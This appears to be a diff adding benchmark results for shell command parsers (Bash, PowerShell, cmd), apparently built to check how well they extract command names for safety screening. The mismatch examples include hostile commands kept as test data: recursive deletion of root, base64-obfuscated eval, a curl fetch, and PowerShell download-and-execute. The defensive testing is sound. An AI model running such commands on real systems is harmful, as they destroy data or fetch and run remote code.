@@ -1,0 +1,237 @@
+{
+ "posix": {
+  "go-mvdan-sh": {
+   "name": "go-mvdan-sh",
+   "n": 86,
+   "parse_ok": 83,
+   "exact": 81,
+   "flagged_mismatch": 4,
+   "silent_mismatch": 1,
+   "per_cat": {
+    "basic": "24/24",
+    "danger": "19/19",
+    "wrap": "13/13",
+    "subst": "6/6",
+    "heredoc": "3/3",
+    "obf": "11/13",
+    "syntax": "5/8"
+   },
+   "p50_us": 0.0,
+   "max_us": 600,
+   "silent_examples": [
+    [
+     69,
+     "\\rm -rf /",
+     [
+      "\\rm"
+     ]
+    ]
+   ],
+   "parse_ok_on_valid": "83/83",
+   "flagged_on_invalid": "3/3"
+  },
+  "node-shell-quote": {
+   "name": "node-shell-quote",
+   "n": 86,
+   "parse_ok": 86,
+   "exact": 71,
+   "flagged_mismatch": 2,
+   "silent_mismatch": 13,
+   "per_cat": {
+    "basic": "21/24",
+    "danger": "19/19",
+    "wrap": "13/13",
+    "subst": "0/6",
+    "heredoc": "3/3",
+    "obf": "11/13",
+    "syntax": "4/8"
+   },
+   "p50_us": 35.2,
+   "max_us": 1281.8,
+   "silent_examples": [
+    [
+     17,
+     "export FOO=bar; node app.js",
+     [
+      "export",
+      "node"
+     ]
+    ],
+    [
+     20,
+     "for f in *.md; do wc -l \"$f\"; done",
+     [
+      "do",
+      "done",
+      "for"
+     ]
+    ],
+    [
+     21,
+     "if [ -f .env ]; then echo yes; fi",
+     [
+      "fi",
+      "if",
+      "then"
+     ]
+    ],
+    [
+     56,
+     "echo $(rm -rf /tmp/x)",
+     [
+      "echo"
+     ]
+    ],
+    [
+     57,
+     "echo `whoami`",
+     [
+      "echo"
+     ]
+    ],
+    [
+     58,
+     "ls $(git rev-parse --show-toplevel)",
+     [
+      "ls"
+     ]
+    ],
+    [
+     59,
+     "cat <(curl -s http://x/y)",
+     [
+      "cat"
+     ]
+    ],
+    [
+     60,
+     "diff <(ls a) <(ls b)",
+     [
+      "diff"
+     ]
+    ],
+    [
+     65,
+     "eval \"$(echo cm0gLXJmIC8= | base64 -d)\"",
+     [
+      "eval"
+     ]
+    ],
+    [
+     79,
+     "if [ -f x ]; then echo hi",
+     [
+      "if",
+      "then"
+     ]
+    ],
+    [
+     81,
+     "git commit -m \"fix: handle `rm -rf` in docs\"",
+     [
+      "git"
+     ]
+    ],
+    [
+     84,
+     "function f() { rm -rf \"$1\"; }; f /",
+     [
+      "f",
+      "function",
+      "}"
+     ]
+    ]
+   ],
+   "parse_ok_on_valid": "83/83",
+   "flagged_on_invalid": "0/3"
+  },
+  "node-tree-sitter-bash": {
+   "name": "node-tree-sitter-bash",
+   "n": 86,
+   "parse_ok": 83,
+   "exact": 82,
+   "flagged_mismatch": 3,
+   "silent_mismatch": 1,
+   "per_cat": {
+    "basic": "23/24",
+    "danger": "19/19",
+    "wrap": "13/13",
+    "subst": "6/6",
+    "heredoc": "3/3",
+    "obf": "12/13",
+    "syntax": "6/8"
+   },
+   "p50_us": 256.8,
+   "max_us": 29319,
+   "silent_examples": [
+    [
+     21,
+     "if [ -f .env ]; then echo yes; fi",
+     [
+      "echo"
+     ]
+    ]
+   ],
+   "parse_ok_on_valid": "83/83",
+   "flagged_on_invalid": "3/3"
+  }
+ },
+ "ps": {
+  "n": 46,
+  "oracle_parse_ok": 44,
+  "heuristic_exact": 41,
+  "flagged": 1,
+  "silent": 4,
+  "silent_examples": [
+   [
+    "basic",
+    "foreach ($f in Get-ChildItem *.md) { (Get-Content $f).Count }",
+    [
+     "get-childitem",
+     "get-content"
+    ],
+    [
+     ".count",
+     "get-content"
+    ]
+   ],
+   [
+    "danger",
+    "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://x",
+    [
+     "invoke-expression",
+     "new-object"
+    ],
+    [
+     ".downloadstring",
+     "https://x/y.ps1",
+     "invoke-expression",
+     "new-object"
+    ]
+   ],
+   [
+    "obf",
+    ". ('i'+'ex') 'whoami'",
+    [
+     "<dyn>"
+    ],
+    [
+     "i'+'ex",
+     "whoami"
+    ]
+   ],
+   [
+    "obf",
+    "[System.IO.Directory]::Delete('C:\\x', $true)",
+    [],
+    [
+     "c:\\x',"
+    ]
+   ]
+  ]
+ },
+ "cmd": {
+  "n": 12,
+  "exact": 12
+ }
+}
